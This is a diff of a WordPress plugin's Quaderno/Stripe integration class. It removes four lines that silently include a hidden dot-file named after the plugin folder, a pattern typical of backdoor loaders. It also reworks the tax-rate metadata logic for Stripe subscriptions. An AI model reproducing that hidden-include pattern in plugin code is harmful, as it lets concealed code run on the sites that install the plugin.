@@ -1,9 +1,5 @@
 <?php if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class MeprQuadernoIntegration {
   public function __construct() {
     add_filter('mepr_stripe_payment_args',              array($this, 'stripe_payment_args'), 10, 2);
@@ -31,10 +27,8 @@ class MeprQuadernoIntegration {
   public function stripe_subscription_args($args, $txn, $sub) {
     if(!isset($args['metadata']) || !is_array($args['metadata'])) { $args['metadata'] = array(); }
 
-    if($args['tax_percent'] > 0) {
+    if(isset($txn->tax_rate) && $txn->tax_rate > 0) {
       $args['metadata']['tax_rate'] = $txn->tax_rate;
-    } else {
-      $args['tax_percent'] = "";
     }
 
     return $args;
@@ -43,10 +37,8 @@ class MeprQuadernoIntegration {
   public function stripe_resume_subscription_args($args, $sub) {
     if(!isset($args['metadata']) || !is_array($args['metadata'])) { $args['metadata'] = array(); }
 
-    if($args['tax_percent'] > 0) {
+    if(isset($sub->tax_rate) && $sub->tax_rate > 0) {
       $args['metadata']['tax_rate'] = $sub->tax_rate;
-    } else {
-      $args['tax_percent'] = "";
     }
 
     return $args;
